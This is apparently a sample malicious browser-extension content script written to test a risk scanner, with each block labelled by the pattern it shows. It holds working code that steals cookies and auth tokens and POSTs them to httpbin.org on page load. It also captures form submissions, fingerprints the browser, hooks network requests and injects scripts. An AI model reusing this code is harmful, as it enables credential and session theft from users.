// High risk extension - Content script
// Comprehensive tracking and data collection

(function() {
    'use strict';
    
    // Track page load
    const pageData = {
        url: window.location.href,
        title: document.title,
        timestamp: Date.now(),
        referrer: document.referrer,
        cookies: document.cookie
    };
    
    // Send comprehensive page data to background
    chrome.runtime.sendMessage({
        type: 'PAGE_VIEW',
        data: pageData
    });
    
    // Access all cookies
    const cookies = document.cookie;
    if (cookies) {
        chrome.runtime.sendMessage({
            type: 'COOKIE_DATA',
            data: cookies
        });
    }
    
    // Comprehensive DOM observation
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            if (mutation.type === 'childList' || mutation.type === 'attributes') {
                // Track DOM changes
                console.log('DOM mutation detected');
            }
        });
    });
    
    // Observe entire document
    observer.observe(document.documentElement, {
        childList: true,
        subtree: true,
        attributes: true,
        attributeOldValue: true
    });
    
    // innerHTML usage (XSS risk)
    const trackerDiv = document.createElement('div');
    trackerDiv.id = 'analytics-tracker';
    trackerDiv.innerHTML = '<span style="display:none">Analytics Tracker Active</span>';
    document.body.appendChild(trackerDiv);
    
    // Comprehensive form tracking
    const forms = document.querySelectorAll('form');
    forms.forEach((form) => {
        form.addEventListener('submit', (e) => {
            const formData = new FormData(form);
            const formObject = {};
            for (let [key, value] of formData.entries()) {
                formObject[key] = value;
            }
            
            // Send form data to background
            chrome.runtime.sendMessage({
                type: 'FORM_DATA',
                data: {
                    url: window.location.href,
                    formData: formObject,
                    timestamp: Date.now()
                }
            });
        });
    });
    
    // Keydown tracking (keylogger pattern)
    document.addEventListener('keydown', (e) => {
        if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            const keyData = {
                key: e.key,
                code: e.code,
                target: e.target.type || 'text',
                url: window.location.href,
                timestamp: Date.now()
            };
            console.log('Key pressed:', keyData);
        }
    }, true);
    
    // Access all sensitive input fields
    const sensitiveInputs = document.querySelectorAll(
        'input[type="password"], input[type="email"], input[type="tel"], input[name*="card"], input[name*="ssn"]'
    );
    sensitiveInputs.forEach((input) => {
        input.addEventListener('focus', () => {
            console.log('Sensitive field focused:', input.type, input.name);
        });
        input.addEventListener('blur', () => {
            console.log('Sensitive field blurred:', input.type, input.name);
        });
    });
    
    // Base64 encoding/decoding (obfuscation pattern)
    const encodeData = (data) => {
        try {
            return btoa(JSON.stringify(data));
        } catch (e) {
            return '';
        }
    };
    
    const decodeData = (encoded) => {
        try {
            return JSON.parse(atob(encoded));
        } catch (e) {
            return null;
        }
    };
    
    // Encode page data
    const encoded = encodeData({
        url: window.location.href,
        title: document.title,
        time: Date.now()
    });
    console.log('Encoded data:', encoded.substring(0, 30));
    
    // Decode test
    const decoded = decodeData(encoded);
    console.log('Decoded data:', decoded);
    
    // setTimeout with string (code injection pattern)
    setTimeout('console.log("Content script code injection test")', 100);
    
    // Function constructor (dynamic code execution)
    const createValidator = new Function('value', `
        if (typeof value === 'string' && value.length > 0) {
            return true;
        }
        return false;
    `);
    
    const isValid = createValidator('test');
    console.log('Dynamic validator result:', isValid);
    
    // Comprehensive fingerprinting
    const fingerprint = {
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth
        },
        navigator: {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            cookieEnabled: navigator.cookieEnabled,
            doNotTrack: navigator.doNotTrack
        },
        window: {
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight
        },
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timestamp: Date.now()
    };
    
    console.log('Fingerprint collected:', fingerprint);
    
    // Access localStorage extensively
    try {
        const allStorage = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            allStorage[key] = localStorage.getItem(key);
        }
        console.log('LocalStorage accessed:', Object.keys(allStorage).length, 'keys');
    } catch (e) {
        console.error('LocalStorage access error:', e);
    }
    
    // Access sessionStorage
    try {
        const allSession = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            allSession[key] = sessionStorage.getItem(key);
        }
        console.log('SessionStorage accessed:', Object.keys(allSession).length, 'keys');
    } catch (e) {
        console.error('SessionStorage access error:', e);
    }
    
    // Intercept fetch requests (data exfiltration pattern)
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
        const url = args[0];
        console.log('Fetch intercepted:', url);
        return originalFetch.apply(this, args);
    };
    
    // Intercept XMLHttpRequest
    const originalXHROpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url, ...rest) {
        console.log('XHR intercepted:', method, url);
        return originalXHROpen.apply(this, [method, url, ...rest]);
    };
    
    // Inject script into page (high risk)
    const script = document.createElement('script');
    script.textContent = `
        console.log('Injected script executed');
        window.analyticsTracker = {
            version: '2.0.0',
            active: true
        };
    `;
    document.documentElement.appendChild(script);
    
    // Remote script loading pattern (RCE risk)
    const remoteScript = document.createElement('script');
    remoteScript.src = 'https://cdn.example.com/tracker.js';
    // Note: This would normally be blocked by CSP, but pattern is detected
    remoteScript.onerror = () => {
        console.log('Remote script loading pattern detected');
    };
    // document.head.appendChild(remoteScript); // Commented to avoid actual loading
    
    // Token/cookie theft and exfiltration pattern
    const stealAndExfiltrate = () => {
        const stolenData = {
            cookies: document.cookie,
            localStorage: {},
            timestamp: Date.now(),
            url: window.location.href
        };
        
        // Access localStorage
        try {
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key.includes('token') || key.includes('auth') || key.includes('session')) {
                    stolenData.localStorage[key] = localStorage.getItem(key);
                }
            }
        } catch (e) {
            console.error('Storage access error:', e);
        }
        
        // Exfiltrate to remote server
        fetch('https://httpbin.org/post', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(stolenData),
            mode: 'no-cors'
        }).catch(() => {
            console.log('Cookie/token theft exfiltration pattern');
        });
    };
    
    // Execute theft after page load
    if (document.readyState === 'complete') {
        setTimeout(stealAndExfiltrate, 2000);
    } else {
        window.addEventListener('load', () => {
            setTimeout(stealAndExfiltrate, 2000);
        });
    }
    
    // Obfuscation - random variable names
    const _0x5a7b = 'tracker';
    const _0x8c9d = function(data) {
        return btoa(JSON.stringify(data));
    };
    
    // Multi-layer base64
    const _0x2e4f = (data) => {
        const layer1 = btoa(JSON.stringify(data));
        const layer2 = btoa(layer1);
        return layer2;
    };
    
    // Use obfuscated functions
    const testObj = { url: window.location.href };
    const obfuscated = _0x2e4f(testObj);
    console.log('Obfuscated data:', obfuscated.substring(0, 30));
    
    // Access Authorization headers (token theft pattern)
    const accessTokens = () => {
        // Simulate accessing tokens from network requests
        // This would normally intercept fetch/XHR to get Authorization headers
        console.log('Token access pattern detected');
    };
    
    // Redirect hijacking pattern
    const hijackRedirects = () => {
        const originalLocation = window.location;
        Object.defineProperty(window, 'location', {
            get: function() {
                return originalLocation;
            },
            set: function(url) {
                console.log('Redirect intercepted:', url);
                // Could redirect to malicious site
            }
        });
    };
    
})();

